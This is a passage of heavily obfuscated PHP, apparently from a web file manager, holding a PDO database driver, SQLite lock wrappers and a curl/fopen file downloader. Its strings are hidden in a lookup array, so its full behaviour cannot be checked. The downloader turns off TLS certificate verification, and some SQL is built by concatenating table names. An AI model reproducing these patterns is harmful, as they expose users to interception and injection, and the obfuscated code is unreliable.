return $this->numRows; } goto Eïæ¸ô‹¹; Eç÷†œø…: $this->queryStr = $dñ•½Ëø”; if (!empty($dÈ´Ï‚ğÉƒ)) { $this->queryStr .= $fóìå¼¤Ÿ£[830] . print_r($dÈ´Ï‚ğÉƒ, !0) . $fóìå¼¤Ÿ£[831]; } $B÷ã¯»š·’ = !1; goto dÔš¹ì’†Í; dÔš¹ì’†Í: if ($this->dbType == $fóìå¼¤Ÿ£[824]) { if (preg_match($fóìå¼¤Ÿ£[832], $this->queryStr, $c‚‘œÁå¡ñ)) { $this->table = think_config($fóìå¼¤Ÿ£[833]) . str_ireplace(think_config($fóìå¼¤Ÿ£[834]), $fóìå¼¤Ÿ£[366], $c‚‘œÁå¡ñ[2]); $B÷ã¯»š·’ = (bool) $this->query($fóìå¼¤Ÿ£[835] . strtoupper($this->table) . $fóìå¼¤Ÿ£[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($fóìå¼¤Ÿ£[21], 1); goto aˆ²ÜõĞ; aˆ²ÜõĞ: think_status($fóìå¼¤Ÿ£[20]); $this->PDOStatement = $this->_linkID->prepare($dñ•½Ëø”); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto e™ö‚­Ç‡å; Eïæ¸ô‹¹: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÖëª¨Ê‡ = $this->_linkID->commit(); $this->transTimes = 0; if (!$AÖëª¨Ê‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bï‹ÏİÛİÉ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bï‹ÏİÛİÉ) { $this->error(); return !1; } } return !0; } private function getAll() { $BËİ¬‡ê‹ß = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($BËİ¬‡ê‹ß); return $BËİ¬‡ê‹ß; } public function getFields($cÌøËçß‚) { goto e³ª‡…ÙĞ«; C÷îâ¢ÏŠÔ: $CªÍò¥ºê = $this->query($a×Ñ‘—ÇÉ); $e¨è™¬Á¿ = array(); if ($CªÍò¥ºê) { foreach ($CªÍò¥ºê as $cô‰—ÓË => $D·ÔÉÖéÉˆ) { $D·ÔÉÖéÉˆ = array_change_key_case($D·ÔÉÖéÉˆ); $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[28]] = isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[28]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[28]] : $F­­•¶¾ÉŸ[366]; $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[29]] = isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[29]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[29]] : $F­­•¶¾ÉŸ[366]; $aÄêçˆè¥¯ = isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[266]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[266]] : $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[28]]; $e¨è™¬Á¿[$aÄêçˆè¥¯] = array($F­­•¶¾ÉŸ[28] => $aÄêçˆè¥¯, $F­­•¶¾ÉŸ[29] => $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[29]], $F­­•¶¾ÉŸ[31] => (bool) (isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[99]]) && $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[99]] === $F­­•¶¾ÉŸ[33] || isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[31]]) && $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[31]] === $F­­•¶¾ÉŸ[33]), $F­­•¶¾ÉŸ[34] => isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[34]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[34]] : (isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[53]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[53]] : $F­­•¶¾ÉŸ[366]), $F­­•¶¾ÉŸ[36] => isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[89]]) ? strtolower($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[89]]) == $F­­•¶¾ÉŸ[38] : (isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[54]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[54]] : !1), $F­­•¶¾ÉŸ[39] => isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[853]]) ? strtolower($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[853]]) == $F­­•¶¾ÉŸ[41] : (isset($D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[89]]) ? $D·ÔÉÖéÉˆ[$F­­•¶¾ÉŸ[89]] : !1)); } } goto b›³æ·¼­‚; b›³æ·¼­‚: return $e¨è™¬Á¿; goto CŒ†ß²Ù“Ñ; e³ª‡…ÙĞ«: $F­­•¶¾ÉŸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (think_config($F­­•¶¾ÉŸ[837])) { $a×Ñ‘—ÇÉ = str_replace($F­­•¶¾ÉŸ[838], $cÌøËçß‚, think_config($F­­•¶¾ÉŸ[837])); } else { switch ($this->dbType) { case $F­­•¶¾ÉŸ[821]: case $F­­•¶¾ÉŸ[839]: $a×Ñ‘—ÇÉ = "\x53\x45\114\x45\103\124\x20\40\40\143\157\154\x75\x6d\x6e\x5f\156\x61\155\145\40\x61\163\40\47\116\141\155\145\x27\54\x20\x20\x20\x64\141\x74\x61\x5f\164\171\x70\145\x20\x61\163\x20\47\124\x79\160\145\47\54\40\40\x20\143\157\154\165\155\156\x5f\x64\x65\x66\x61\x75\x6c\x74\x20\x61\163\x20\47\104\x65\146\141\x75\x6c\164\x27\x2c\x20\40\40\151\x73\137\x6e\165\154\154\141\x62\154\145\40\x61\163\x20\47\116\165\x6c\x6c\x27\12\11\11\106\x52\117\115\x9\x69\x6e\146\157\162\x6d\141\x74\151\157\156\x5f\163\x63\150\145\x6d\x61\x2e\x74\x61\142\154\x65\x73\x20\x41\123\x20\x74\12\x9\11\112\x4f\111\x4e\x9\151\x6e\x66\x6f\x72\155\141\x74\151\157\x6e\x5f\163\143\x68\145\155\141\56\x63\x6f\154\x75\x6d\x6e\x73\40\101\x53\40\143\xa\11\11\x4f\116\x20\40\x74\x2e\x74\x61\142\154\x65\x5f\x63\x61\x74\x61\154\157\x67\40\x3d\40\143\56\x74\141\x62\154\x65\137\143\x61\164\141\x6c\157\147\xa\x9\x9\x41\x4e\x44\x20\x74\x2e\x74\141\142\154\145\137\x73\x63\150\x65\155\141\x20\75\x20\x63\56\x74\141\x62\x6c\x65\x5f\x73\x63\x68\145\155\x61\12\x9\11\101\116\104\x20\164\56\x74\141\x62\x6c\x65\x5f\x6e\141\x6d\x65\x20\x3d\40\143\56\x74\x61\x62\x6c\145\137\156\141\x6d\145\xa\11\x9\127\x48\105\122\105\x20\x20\40\x74\56\x74\x61\142\154\145\x5f\156\x61\x6d\145\40\x3d\x20\47{$cÌøËçß‚}\47"; break; case $F­­•¶¾ÉŸ[840]: $a×Ñ‘—ÇÉ = $F­­•¶¾ÉŸ[841] . $cÌøËçß‚ . $F­­•¶¾ÉŸ[842]; break; case $F­­•¶¾ÉŸ[822]: case $F­­•¶¾ÉŸ[824]: $a×Ñ‘—ÇÉ = $F­­•¶¾ÉŸ[843] . $F­­•¶¾ÉŸ[844] . $F­­•¶¾ÉŸ[845] . strtoupper($cÌøËçß‚) . $F­­•¶¾ÉŸ[846] . strtoupper($cÌøËçß‚) . $F­­•¶¾ÉŸ[847]; break; case $F­­•¶¾ÉŸ[848]: $a×Ñ‘—ÇÉ = $F­­•¶¾ÉŸ[849] . $cÌøËçß‚ . $F­­•¶¾ÉŸ[850]; break; case $F­­•¶¾ÉŸ[823]: break; case $F­­•¶¾ÉŸ[851]: default: $a×Ñ‘—ÇÉ = $F­­•¶¾ÉŸ[852] . ($this->dbType == $F­­•¶¾ÉŸ[851] ? "\x60{$cÌøËçß‚}\x60" : $cÌøËçß‚); } } goto C÷îâ¢ÏŠÔ; CŒ†ß²Ù“Ñ: } public function getTables($aµ‹ÈŞù‚é = '') { $eßÅÊò±¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (think_config($eßÅÊò±¿[854])) { $E¥×˜¸ó = str_replace($eßÅÊò±¿[855], $aµ‹ÈŞù‚é, think_config($eßÅÊò±¿[854])); } else { switch ($this->dbType) { case $eßÅÊò±¿[822]: case $eßÅÊò±¿[824]: $E¥×˜¸ó = $eßÅÊò±¿[856]; break; case $eßÅÊò±¿[821]: case $eßÅÊò±¿[839]: $E¥×˜¸ó = $eßÅÊò±¿[857]; break; case $eßÅÊò±¿[848]: $E¥×˜¸ó = $eßÅÊò±¿[858]; break; case $eßÅÊò±¿[823]: think_exception(think_lang($eßÅÊò±¿[859]) . $eßÅÊò±¿[860]); break; case $eßÅÊò±¿[840]: $E¥×˜¸ó = $eßÅÊò±¿[42] . $eßÅÊò±¿[43] . $eßÅÊò±¿[44]; break; case $eßÅÊò±¿[851]: default: if (!empty($aµ‹ÈŞù‚é)) { $E¥×˜¸ó = $eßÅÊò±¿[804] . $aµ‹ÈŞù‚é; } else { $E¥×˜¸ó = $eßÅÊò±¿[805]; } } } $Dß“Ëš„œ = $this->query($E¥×˜¸ó); $e…ªÀÉ›ó = array(); foreach ($Dß“Ëš„œ as $eÆÛš×Á« => $eŒ¬æİ—‰ã) { $e…ªÀÉ›ó[$eÆÛš×Á«] = current($eŒ¬æİ—‰ã); } return $e…ªÀÉ›ó; } protected function parseLimit($aß½‡’ù˜Î) { $fƒ–Ú¢¿¯Š =& $_SERVER[ºÖÙÂŒäÉê‡]; $cõÛ×ßñßî = $fƒ–Ú¢¿¯Š[33]; if (!empty($aß½‡’ù˜Î)) { switch ($this->dbType) { case $fƒ–Ú¢¿¯Š[848]: case $fƒ–Ú¢¿¯Š[840]: $aß½‡’ù˜Î = explode($fƒ–Ú¢¿¯Š[47], $aß½‡’ù˜Î); if (count($aß½‡’ù˜Î) > 1) { $cõÛ×ßñßî .= $fƒ–Ú¢¿¯Š[48] . $aß½‡’ù˜Î[1] . $fƒ–Ú¢¿¯Š[49] . $aß½‡’ù˜Î[0] . $fƒ–Ú¢¿¯Š[50]; } else { $cõÛ×ßñßî .= $fƒ–Ú¢¿¯Š[48] . $aß½‡’ù˜Î[0] . $fƒ–Ú¢¿¯Š[50]; } break; case $fƒ–Ú¢¿¯Š[821]: case $fƒ–Ú¢¿¯Š[839]: break; case $fƒ–Ú¢¿¯Š[823]: break; case $fƒ–Ú¢¿¯Š[822]: case $fƒ–Ú¢¿¯Š[824]: break; case $fƒ–Ú¢¿¯Š[851]: default: $cõÛ×ßñßî .= $fƒ–Ú¢¿¯Š[48] . $aß½‡’ù˜Î . $fƒ–Ú¢¿¯Š[50]; } } return $cõÛ×ßñßî; } public function parseKey(&$BÛÖ¬‹Æ×, $aé­°¬ğ×ç = true) { $E½ÈÕ„›İå =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($aé­°¬ğ×ç) { $BÛÖ¬‹Æ× = $this->parseKeyCheck($BÛÖ¬‹Æ×); } if ($this->dbType == $E½ÈÕ„›İå[851]) { if ($BÛÖ¬‹Æ× != $E½ÈÕ„›İå[182] && !preg_match($E½ÈÕ„›İå[815], $BÛÖ¬‹Æ×)) { $BÛÖ¬‹Æ× = $E½ÈÕ„›İå[816] . trim($BÛÖ¬‹Æ×, $E½ÈÕ„›İå[816]) . $E½ÈÕ„›İå[816]; } return $BÛÖ¬‹Æ×; } else { return parent::parseKey($BÛÖ¬‹Æ×); } } public function close() { $this->_linkID = null; } public function error() { $b„³ñ‹š…Å =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->PDOStatement) { $Dâä™©ŠÑ = $this->PDOStatement->errorInfo(); $this->error = $Dâä™©ŠÑ[1] . $b„³ñ‹š…Å[4] . $Dâä™©ŠÑ[2]; } else { $this->error = $b„³ñ‹š…Å[33]; } if ($b„³ñ‹š…Å[33] != $this->queryStr) { $this->error .= LNG($b„³ñ‹š…Å[45]) . $this->queryStr; } think_trace($this->error, $b„³ñ‹š…Å[33], $b„³ñ‹š…Å[46]); return $this->error; } public function escapeString($FÃìã·ä…) { $aß»Í›Ã‹« =& $_SERVER[ºÖÙÂŒäÉê‡]; switch ($this->dbType) { case $aß»Í›Ã‹«[848]: case $aß»Í›Ã‹«[821]: case $aß»Í›Ã‹«[839]: case $aß»Í›Ã‹«[851]: return addslashes($FÃìã·ä…); case $aß»Í›Ã‹«[823]: case $aß»Í›Ã‹«[840]: case $aß»Í›Ã‹«[822]: case $aß»Í›Ã‹«[824]: return str_ireplace($aß»Í›Ã‹«[55], $aß»Í›Ã‹«[56], $FÃìã·ä…); } } protected function parseValue($a¾‚„Òöòˆ) { $D›•‘äŞÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_string($a¾‚„Òöòˆ)) { $a¾‚„Òöòˆ = strpos($a¾‚„Òöòˆ, $D›•‘äŞÁ[4]) === 0 ? $this->escapeString($a¾‚„Òöòˆ) : $D›•‘äŞÁ[861] . $this->escapeString($a¾‚„Òöòˆ) . $D›•‘äŞÁ[861]; } elseif (isset($a¾‚„Òöòˆ[0]) && is_string($a¾‚„Òöòˆ[0]) && strtolower($a¾‚„Òöòˆ[0]) == $D›•‘äŞÁ[290]) { $a¾‚„Òöòˆ = $this->escapeString($a¾‚„Òöòˆ[1]); } elseif (is_array($a¾‚„Òöòˆ)) { $a¾‚„Òöòˆ = array_map(array($this, $D›•‘äŞÁ[862]), $a¾‚„Òöòˆ); } elseif (is_bool($a¾‚„Òöòˆ)) { $a¾‚„Òöòˆ = $a¾‚„Òöòˆ ? $D›•‘äŞÁ[83] : $D›•‘äŞÁ[472]; } elseif (is_null($a¾‚„Òöòˆ)) { $a¾‚„Òöòˆ = $D›•‘äŞÁ[99]; } return $a¾‚„Òöòˆ; } public function getLastInsertId() { $a¼åçº˜Éª =& $_SERVER[ºÖÙÂŒäÉê‡]; switch ($this->dbType) { case $a¼åçº˜Éª[848]: case $a¼åçº˜Éª[840]: case $a¼åçº˜Éª[821]: case $a¼åçº˜Éª[839]: case $a¼åçº˜Éª[823]: case $a¼åçº˜Éª[851]: return $this->_linkID->lastInsertId(); case $a¼åçº˜Éª[822]: case $a¼åçº˜Éª[824]: $A†Ùßœœèİ = $this->table; $e¿†ÅÛ¼‡¤ = $this->query("\x53\x45\114\x45\103\x54\x20{$A†Ùßœœèİ}\x2e\x63\x75\162\x72\166\141\154\40\x63\165\x72\162\x76\x61\154\x20\x46\122\x4f\115\x20\144\x75\x61\x6c"); return $e¿†ÅÛ¼‡¤ ? $e¿†ÅÛ¼‡¤[0][$a¼åçº˜Éª[863]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($BˆíÊß•ÒÂ) { goto aöù§ğÇ¿İ; Ağ´ÜŠó: if (!$F©±ËĞÙœŸ) { return !1; } if (flock($F©±ËĞÙœŸ, LOCK_EX)) { $B’ÏÏÔò”° = parent::query($BˆíÊß•ÒÂ); flock($F©±ËĞÙœŸ, LOCK_UN); fclose($F©±ËĞÙœŸ); return $B’ÏÏÔò”°; } flock($F©±ËĞÙœŸ, LOCK_UN); goto eäŸµî¬İ˜; aöù§ğÇ¿İ: $B—Ùë‹â²Ò =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÖò›°¦ï£ = DATA_PATH . $B—Ùë‹â²Ò[864]; $F©±ËĞÙœŸ = fopen($EÖò›°¦ï£, $B—Ùë‹â²Ò[865]); goto Ağ´ÜŠó; eäŸµî¬İ˜: fclose($F©±ËĞÙœŸ); show_json($B—Ùë‹â²Ò[866], !1); return !1; goto c»ÑšØˆ••; c»ÑšØˆ••: } public function execute($Báé˜£ÊßÃ) { goto c«êÖŠê†ğ; Fê¿Ğ¤£Ú: if (!$eŠö¢‡ Ç) { return !1; } if (flock($eŠö¢‡ Ç, LOCK_EX)) { $DÃ­æÁËÕº = parent::execute($Báé˜£ÊßÃ); flock($eŠö¢‡ Ç, LOCK_UN); fclose($eŠö¢‡ Ç); return $DÃ­æÁËÕº; } flock($eŠö¢‡ Ç, LOCK_UN); goto CÆÄ°ñÂáÄ; c«êÖŠê†ğ: $E†í±æ˜ª  =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bİ¼šÏëëÌ = DATA_PATH . $E†í±æ˜ª [864]; $eŠö¢‡ Ç = fopen($Bİ¼šÏëëÌ, $E†í±æ˜ª [865]); goto Fê¿Ğ¤£Ú; CÆÄ°ñÂáÄ: fclose($eŠö¢‡ Ç); show_json($E†í±æ˜ª [866], !1); return !1; goto D®‚ö¼Ò; D®‚ö¼Ò: } } class DbSqlite3 extends DbSqlite3Base { public function query($B®‹œ¤…£ô) { goto b‰ˆ†Ïäí; F©å‚—ÄÈ: fclose($cô½²­“†¿); show_json($AŒÜíå¥à[866], !1); return !1; goto d××¬µ–; b‰ˆ†Ïäí: $AŒÜíå¥à =& $_SERVER[ºÖÙÂŒäÉê‡]; $eé§êÎÀˆ½ = DATA_PATH . $AŒÜíå¥à[864]; $cô½²­“†¿ = fopen($eé§êÎÀˆ½, $AŒÜíå¥à[865]); goto E¸ŒÚÕŞ¡œ; E¸ŒÚÕŞ¡œ: if (!$cô½²­“†¿) { return !1; } if (flock($cô½²­“†¿, LOCK_EX)) { $A¶•×…ß = parent::query($B®‹œ¤…£ô); flock($cô½²­“†¿, LOCK_UN); fclose($cô½²­“†¿); return $A¶•×…ß; } flock($cô½²­“†¿, LOCK_UN); goto F©å‚—ÄÈ; d××¬µ–: } public function execute($CÍ—¯Œ³) { goto f›»ªî™•Å; f›»ªî™•Å: $A¶Å¤Ó—Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $c•Ôñ¹ö‚µ = DATA_PATH . $A¶Å¤Ó—Î[864]; $EÃ˜ÊÇôŠš = fopen($c•Ôñ¹ö‚µ, $A¶Å¤Ó—Î[865]); goto bĞÛå•§Ä…; bĞÛå•§Ä…: if (!$EÃ˜ÊÇôŠš) { return !1; } if (flock($EÃ˜ÊÇôŠš, LOCK_EX)) { $CÑŒñÍ¤Ñ‚ = parent::execute($CÍ—¯Œ³); flock($EÃ˜ÊÇôŠš, LOCK_UN); fclose($EÃ˜ÊÇôŠš); return $CÑŒñÍ¤Ñ‚; } flock($EÃ˜ÊÇôŠš, LOCK_UN); goto AÁ¥ÎÒâ¼˜; AÁ¥ÎÒâ¼˜: fclose($EÃ˜ÊÇôŠš); show_json($A¶Å¤Ó—Î[866], !1); return !1; goto EŒËŠª¬Š; EŒËŠª¬Š: } } goto Bœ¬æ÷ĞŒ—; c³É¾ÌŠ…£: class Downloader { static function start($fÚÍ¬§©¿, $e‡İæĞ³±, $c¸¯Ÿ—¼©› = 10) { goto d™ë™®ŸÑ‡; d™ë™®ŸÑ‡: $DÁõÖìÜ’ƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!request_url_safe($fÚÍ¬§©¿)) { return array($DÁõÖìÜ’ƒ[1022] => !1, $DÁõÖìÜ’ƒ[1024] => $DÁõÖìÜ’ƒ[1027]); } $DÌĞƒŒ£Ã = $e‡İæĞ³± . $DÁõÖìÜ’ƒ[1476]; goto b»²™Ã¬ ¢; EŸ¿µó¤®á: if ($bŸğµò–§¯[$DÁõÖìÜ’ƒ[1022]]) { @unlink($DÌĞƒŒ£Ã); } return $bŸğµò–§¯; goto EÎÁ˜èèê; dßÊœƒ»§É: if (!$fÚÍ¬§©¿) { return array($DÁõÖìÜ’ƒ[1022] => !1, $DÁõÖìÜ’ƒ[1024] => $DÁõÖìÜ’ƒ[1027]); } if (!$a¨­¦âî‚›[$DÁõÖìÜ’ƒ[1271]] || $a¨­¦âî‚›[$DÁõÖìÜ’ƒ[330]] == 0) { @unlink($bŒì÷©½¸•); @unlink($e‡İæĞ³±); $bŸğµò–§¯ = self::fileDownloadFopen($fÚÍ¬§©¿, $e‡İæĞ³±, $a¨­¦âî‚›[$DÁõÖìÜ’ƒ[330]]); if ($bŸğµò–§¯[$DÁõÖìÜ’ƒ[1022]]) { return $bŸğµò–§¯; } else { @unlink($bŒì÷©½¸•); @unlink($e‡İæĞ³±); $bŸğµò–§¯ = self::fileDownloadCurl($fÚÍ¬§©¿, $e‡İæĞ³±, !1, 0, $a¨­¦âî‚›[$DÁõÖìÜ’ƒ[330]]); @unlink($bŒì÷©½¸•); return $bŸğµò–§¯; } } $Aääò¾£ç½ = is_file($bŒì÷©½¸•) ? filesize($bŒì÷©½¸•) : 0; goto fÎò¬‰ŒŒø; CÆàÁá–Œ·: if ($Aääò¾£ç½ > $CŠ™–ô—ôß) { @unlink($bŒì÷©½¸•); } file_put_contents($DÌĞƒŒ£Ã, json_encode($fÂ¢âÒ½İ£)); $bŸğµò–§¯ = self::fileDownloadCurl($fÚÍ¬§©¿, $e‡İæĞ³±, !0, $Aääò¾£ç½, $CŠ™–ô—ôß); goto EŸ¿µó¤®á; b»²™Ã¬ ¢: $bŒì÷©½¸• = $e‡İæĞ³± . $DÁõÖìÜ’ƒ[1477]; if (is_array($fÚÍ¬§©¿)) { $a¨­¦âî‚› = $fÚÍ¬§©¿; } else { $a¨­¦âî‚› = url_header($fÚÍ¬§©¿); } $fÚÍ¬§©¿ = $a¨­¦âî‚›[$DÁõÖìÜ’ƒ[300]]; goto dßÊœƒ»§É; A’ñè¥ñ„Ş: if (is_file($DÌĞƒŒ£Ã)) { $B·Š‰Û¦ ¢ = file_get_contents($DÌĞƒŒ£Ã); $fÂ¢âÒ½İ£ = json_decode($B·Š‰Û¦ ¢, 1); } if (file_exists($e‡İæĞ³±) && $CŠ™–ô—ôß == filesize($e‡İæĞ³±)) { @unlink($bŒì÷©½¸•); @unlink($DÌĞƒŒ£Ã); return array($DÁõÖìÜ’ƒ[1022] => !0, $DÁõÖìÜ’ƒ[1024] => $DÁõÖìÜ’ƒ[1479]); } if ($fÂ¢âÒ½İ£[$DÁõÖìÜ’ƒ[330]] != $CŠ™–ô—ôß) { $fÂ¢âÒ½İ£ = array($DÁõÖìÜ’ƒ[330] => $CŠ™–ô—ôß); } goto CÆàÁá–Œ·; fÎò¬‰ŒŒø: $CŠ™–ô—ôß = intval($a¨­¦âî‚›[$DÁõÖìÜ’ƒ[330]]); if (file_exists($bŒì÷©½¸•) && time() - filemtime($bŒì÷©½¸•) < 3) { return array($DÁõÖìÜ’ƒ[1022] => !1, $DÁõÖìÜ’ƒ[1024] => $DÁõÖìÜ’ƒ[1478]); } $fÂ¢âÒ½İ£ = array(); goto A’ñè¥ñ„Ş; EÎÁ˜èèê: } static function fileDownloadFopen($bœÛ±ÚÊ£¸, $BÍ‰íòÛÓ½, $B™ªóÂ–á = 0) { $CÒ¦®¡ØÍ‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; @ini_set($CÒ¦®¡ØÍ‡[1480], $CÒ¦®¡ØÍ‡[1481]); $BÜ‡çñòä = $BÍ‰íòÛÓ½ . $CÒ¦®¡ØÍ‡[1477]; set_timeout(); @unlink($BÜ‡çñòä); if ($C¢í¿ŞÀ‹¬ = @fopen($bœÛ±ÚÊ£¸, $CÒ¦®¡ØÍ‡[1482])) { goto c·‘Ïïøó; c·‘Ïïøó: if (!($AÕÅ—Ó‹ƒ± = @fopen($BÜ‡çñòä, $CÒ¦®¡ØÍ‡[1483]))) { return array($CÒ¦®¡ØÍ‡[1022] => !1, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[1484]); } while (!feof($C¢í¿ŞÀ‹¬)) { if (!file_exists($BÜ‡çñòä)) { fclose($AÕÅ—Ó‹ƒ±); return array($CÒ¦®¡ØÍ‡[1022] => !1, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[1485]); } clearstatcache(); if ($B™ªóÂ–á > 0 && $B™ªóÂ–á == filesize(iconv_system($BÜ‡çñòä))) { break; } fwrite($AÕÅ—Ó‹ƒ±, fread($C¢í¿ŞÀ‹¬, 1024 * 8), 1024 * 8); } fclose($AÕÅ—Ó‹ƒ±); goto Bï Ì¼½å˜; Dº·ÇÒ²•™: self::checkGzip($BÜ‡çñòä); if (!@rename($BÜ‡çñòä, $BÍ‰íòÛÓ½)) { usleep(round(rand(0, 1000) * 50)); @unlink($BÍ‰íòÛÓ½); $fİ£ˆÖÌª† = @rename($BÜ‡çñòä, $BÍ‰íòÛÓ½); if (!$fİ£ˆÖÌª†) { return array($CÒ¦®¡ØÍ‡[1022] => !1, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[1487]); } } return array($CÒ¦®¡ØÍ‡[1022] => !0, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[693]); goto D‰º¢‰í«í; Bï Ì¼½å˜: fclose($C¢í¿ŞÀ‹¬); $FÀ‰Çù­ƒ = filesize(iconv_system($BÜ‡çñòä)); if ($B™ªóÂ–á != 0 && $FÀ‰Çù­ƒ != $B™ªóÂ–á) { return array($CÒ¦®¡ØÍ‡[1022] => !1, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[1486]); } goto Dº·ÇÒ²•™; D‰º¢‰í«í: } else { return array($CÒ¦®¡ØÍ‡[1022] => !1, $CÒ¦®¡ØÍ‡[1024] => $CÒ¦®¡ØÍ‡[1488]); } } static function fileDownloadCurl($aİàó…š…ù, $Bµ¼ ï¹¶, $f÷‚éŒ‘÷Ë = false, $Fá¡ØÉÈ´ = 0, $E¦½áÊ¢ƒ½ = 0) { goto E‰ä¿†¦ñ‘; a‡“±´Äùš: return array($BÂ“âŞ‰ˆá[1022] => !1, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[1492]); goto dí¡Š…¡—; AÎ™ãµ¢íŸ: $b§ƒ«Óˆ¿ì = @fopen($F¿Ÿ«Ç•³ñ, $BÂ“âŞ‰ˆá[972]); if (!$b§ƒ«Óˆ¿ì) { return array($BÂ“âŞ‰ˆá[1022] => !1, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[1489]); } $dÑšÒ­ŠŸí = curl_init($aİàó…š…ù); goto c¢¯“ÑÓó; Cõ‰ŞÊ“ˆ¿: curl_setopt($dÑšÒ­ŠŸí, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($dÑšÒ­ŠŸí, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($dÑšÒ­ŠŸí, CURLOPT_SSL_VERIFYHOST, 0); goto F§“šœ¸Ã†; E‰ä¿†¦ñ‘: $BÂ“âŞ‰ˆá =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¿Ÿ«Ç•³ñ = $Bµ¼ ï¹¶ . $BÂ“âŞ‰ˆá[1477]; set_timeout(); goto AÎ™ãµ¢íŸ; c„£¸¯Š¤: if ($e˜Ôö¤²ÔÑ < $E¦½áÊ¢ƒ½ && $E¦½áÊ¢ƒ½ != 0) { return array($BÂ“âŞ‰ˆá[1022] => !1, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[1478]); } if ($e˜Ôö¤²ÔÑ > $E¦½áÊ¢ƒ½ && $E¦½áÊ¢ƒ½ != 0) { return array($BÂ“âŞ‰ˆá[1022] => !1, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[1486]); } if ($eÂõ¥†Âë­ && filesize($F¿Ÿ«Ç•³ñ) != 0) { self::checkGzip($F¿Ÿ«Ç•³ñ); if (!@rename($F¿Ÿ«Ç•³ñ, $Bµ¼ ï¹¶)) { @unlink($Bµ¼ ï¹¶); $eÂõ¥†Âë­ = @rename($F¿Ÿ«Ç•³ñ, $Bµ¼ ï¹¶); if (!$eÂõ¥†Âë­) { return array($BÂ“âŞ‰ˆá[1022] => !1, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[1491]); } } return array($BÂ“âŞ‰ˆá[1022] => !0, $BÂ“âŞ‰ˆá[1024] => $BÂ“âŞ‰ˆá[693]); } goto a‡“±´Äùš; A¨äåœšÓ: curl_setopt($dÑšÒ­ŠŸí, CURLOPT_USERAGENT, $BÂ“âŞ‰ˆá[1481]); $eÂõ¥†Âë­ = curl_exec($dÑšÒ­ŠŸí); curl_progress_end($dÑšÒ­ŠŸí); goto eï‡èøİš; c¢¯“ÑÓó: if ($f÷‚éŒ‘÷Ë) { curl_setopt($dÑšÒ­ŠŸí, CURLOPT_RANGE, $Fá¡ØÉÈ´ . $BÂ“âŞ‰ˆá[713]); } curl_setopt($dÑšÒ­ŠŸí, CURLOPT_FILE, $b§ƒ«Óˆ¿ì); curl_setopt($dÑšÒ­ŠŸí, CURLOPT_REFERER, get_url_link($aİàó…š…ù)); goto Cõ‰ŞÊ“ˆ¿; eï‡èøİš: curl_close($dÑšÒ­ŠŸí); fclose($b§ƒ«Óˆ¿ì); $e˜Ôö¤²ÔÑ = filesize(iconv_system($F¿Ÿ«Ç•³ñ)); goto c„£¸¯Š¤; F§“šœ¸Ã†: curl_setopt($dÑšÒ­ŠŸí, CURLOPT_NOPROGRESS, !1); curl_setopt($dÑšÒ­ŠŸí, CURLOPT_PROGRESSFUNCTION, $BÂ“âŞ‰ˆá[1490]); curl_progress_start($dÑšÒ­ŠŸí); goto A¨äåœšÓ; dí¡Š…¡—: } static function checkGzip($Cİ¹‰‹ºò) { goto 